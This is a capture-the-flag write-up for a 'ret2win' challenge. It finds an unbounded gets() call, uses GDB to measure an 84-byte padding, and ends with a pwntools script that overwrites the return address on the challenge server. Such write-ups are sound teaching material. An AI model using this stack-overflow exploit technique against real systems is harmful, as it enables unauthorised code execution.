# Ret2Win
This challenges using a basic concept of pwn called ret2win, download the call at [chall](https://github.com/Langhere/WriteUpCTFlocal/blob/main/Stembactf/ret2win/chall)

# cheksec

<img width="539" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/2f158f3a-2c80-4989-8011-cf8dc6799cc5">

# Problem
Let see the Source Code and try analysis

<img width="487" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/325e749e-d90f-4519-9172-6e837ce27abd">

the vuln at gets(), cause not the filter number of characters entered.



# What You Need
- padding
- flag address

# Chain You Needed
## Padding
### I using GDB and gef extensions
<img width="480" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/3f4146a8-0f41-4b5a-b2f4-791e90baf5df">

break after gets() and run with random input, i use 12345 for input


<img width="500" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/b7e414bb-f62c-4f9d-a259-d4320164fddd">

<img width="566" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/f0191946-889f-408d-8500-b51bb9190d09">

`formula = buffer address - eip`

The padding is 84

## FLag Address
0x08049203
search using gdb and the flag address name is ini_flag

# Create solver
`Final Exploit`

```
from pwn import *
#p = process('./chall')
p = remote('stembactf.space', 5202)
payload = b'A' * 84
payload += p32(0x08049203)

p.sendline(payload)

p.interactive()

```

# Result

<img width="776" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/d6ef7ba7-ac16-47dd-83f5-91b3c21110d9">

has pwned

